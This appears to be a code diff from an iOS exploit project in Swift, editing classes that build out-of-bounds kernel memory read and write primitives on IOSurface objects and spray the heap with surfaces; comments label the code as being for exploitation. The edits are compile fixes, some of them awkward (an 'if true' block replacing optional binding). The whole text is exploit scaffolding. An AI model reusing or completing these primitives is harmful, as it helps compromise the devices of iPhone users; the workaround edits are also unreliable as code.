@@ -27,12 +27,12 @@ class IOSurfacePrimitive {
         
         // Create IOSurface with specific properties for exploitation
         let properties: [String: Any] = [
-            kIOSurfaceWidth: 1024,
-            kIOSurfaceHeight: 1024,
-            kIOSurfaceBytesPerElement: 4,
-            kIOSurfaceBytesPerRow: 4096,
-            kIOSurfaceAllocSize: 4096 * 1024,
-            kIOSurfacePixelFormat: kCVPixelFormatType_32BGRA
+            kIOSurfaceWidth as String: 1024,
+            kIOSurfaceHeight as String: 1024,
+            kIOSurfaceBytesPerElement as String: 4,
+            kIOSurfaceBytesPerRow as String: 4096,
+            kIOSurfaceAllocSize as String: 4096 * 1024,
+            kIOSurfacePixelFormat as String: kCVPixelFormatType_32BGRA
         ]
         
         guard let surf = IOSurfaceCreate(properties as CFDictionary) else {
@@ -46,7 +46,7 @@ class IOSurfacePrimitive {
         IOSurfaceLock(surf, .readOnly, nil)
         
         // Get base address
-        if let basePtr = IOSurfaceGetBaseAddress(surf) {
+        let basePtr = IOSurfaceGetBaseAddress(surf); if true {
             self.baseAddress = UInt64(UInt(bitPattern: basePtr))
         }
         
@@ -63,7 +63,7 @@ class IOSurfacePrimitive {
         let offset = Int(address - baseAddress)
         
         // Use IOSurface OOB read
-        guard let basePtr = IOSurfaceGetBaseAddress(surf) else { return 0 }
+        let basePtr = IOSurfaceGetBaseAddress(surf); guard basePtr != UnsafeMutableRawPointer(bitPattern: 0) else { return 0 }
         let ptr = basePtr.advanced(by: offset)
         
         return ptr.load(as: UInt64.self)
@@ -76,7 +76,7 @@ class IOSurfacePrimitive {
         let offset = Int(address - baseAddress)
         
         // Use IOSurface OOB write
-        guard let basePtr = IOSurfaceGetBaseAddress(surf) else { return false }
+        let basePtr = IOSurfaceGetBaseAddress(surf); guard basePtr != UnsafeMutableRawPointer(bitPattern: 0) else { return false }
         let ptr = basePtr.advanced(by: offset)
         
         ptr.storeBytes(of: value, as: UInt64.self)
@@ -88,7 +88,7 @@ class IOSurfacePrimitive {
         guard isSetup, let surf = surface else { return nil }
         
         let offset = Int(address - baseAddress)
-        guard let basePtr = IOSurfaceGetBaseAddress(surf) else { return nil }
+        let basePtr = IOSurfaceGetBaseAddress(surf); guard basePtr != UnsafeMutableRawPointer(bitPattern: 0) else { return nil }
         
         let ptr = basePtr.advanced(by: offset)
         return Data(bytes: ptr, count: size)
@@ -98,7 +98,7 @@ class IOSurfacePrimitive {
         guard isSetup, let surf = surface else { return false }
         
         let offset = Int(address - baseAddress)
-        guard let basePtr = IOSurfaceGetBaseAddress(surf) else { return false }
+        let basePtr = IOSurfaceGetBaseAddress(surf); guard basePtr != UnsafeMutableRawPointer(bitPattern: 0) else { return false }
         
         let ptr = basePtr.advanced(by: offset)
         data.withUnsafeBytes { bytes in
@@ -170,12 +170,12 @@ class IOSurfaceSpray {
         
         for _ in 0..<count {
             let properties: [String: Any] = [
-                kIOSurfaceWidth: 1024,
-                kIOSurfaceHeight: size / 4096,
-                kIOSurfaceBytesPerElement: 4,
-                kIOSurfaceBytesPerRow: 4096,
-                kIOSurfaceAllocSize: size,
-                kIOSurfacePixelFormat: kCVPixelFormatType_32BGRA
+                (kIOSurfaceWidth as String): 1024,
+                (kIOSurfaceHeight as String): size / 4096,
+                (kIOSurfaceBytesPerElement as String): 4,
+                (kIOSurfaceBytesPerRow as String): 4096,
+                (kIOSurfaceAllocSize as String): size,
+                (kIOSurfacePixelFormat as String): kCVPixelFormatType_32BGRA
             ]
             
             guard let surf = IOSurfaceCreate(properties as CFDictionary) else {
@@ -192,7 +192,7 @@ class IOSurfaceSpray {
         for surf in surfaces {
             IOSurfaceLock(surf, [], nil)
             
-            if let basePtr = IOSurfaceGetBaseAddress(surf) {
+            let basePtr = IOSurfaceGetBaseAddress(surf); if true {
                 let size = IOSurfaceGetAllocSize(surf)
                 let count = size / 8
                 
